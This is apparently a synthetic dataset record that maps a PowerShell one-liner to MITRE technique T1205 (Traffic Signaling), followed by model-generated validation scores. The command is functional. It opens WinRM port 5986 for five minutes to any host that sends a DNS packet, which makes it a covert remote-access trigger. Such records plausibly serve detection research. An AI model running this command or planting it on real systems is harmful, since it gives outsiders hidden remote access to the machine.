{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+53\\b') { $src=$matches[1]; $name=\"dns-txt-5986-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
  "explanation": "Uses unusual inbound DNS packets (UDP/53 to a non-DNS host) as a signal to permit WinRM over HTTPS (5986) for the source IP.",
  "rationale_steps": [
    "Enable firewall dropped-packet logging",
    "Detect inbound DNS queries to the host",
    "Add a temporary allow rule for TCP/5986 restricted to the sender",
    "Auto-remove after 5 minutes"
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-419c2bb8-dea8fbe0",
  "source_prompt_hash": "419c2bb8",
  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed PowerShell with balanced braces, correct quoting, valid cmdlets/parameters, and proper pipelines/separators.",
        "semantic_score": 4,
        "semantic_justification": "It monitors firewall DROP logs for UDP/53 as a signal and temporarily opens WinRM (5986) for the source IP, aligning with Traffic Signaling, but depends on admin privileges and enabled PSRemoting on localhost.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-01T17:41:44.912318Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "All PowerShell cmdlets, parameters, flow control, and regex are correctly formatted, balanced, and syntactically valid.",
        "semantic_score": 3,
        "semantic_justification": "The command's logic precisely implements the claimed traffic signaling technique by detecting dropped DNS packets and dynamically opening WinRM; however, it implicitly requires Administrator privileges to modify firewall rules and enable logging, which contradicts the stated 'Privilege: None', making it operationally unfeasible as described.",
        "combined_score": 4.0,
        "confidence": 1,
        "timestamp": "2025-10-01T17:42:07.915556Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.5,
    "llm_average_score": 4.25,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}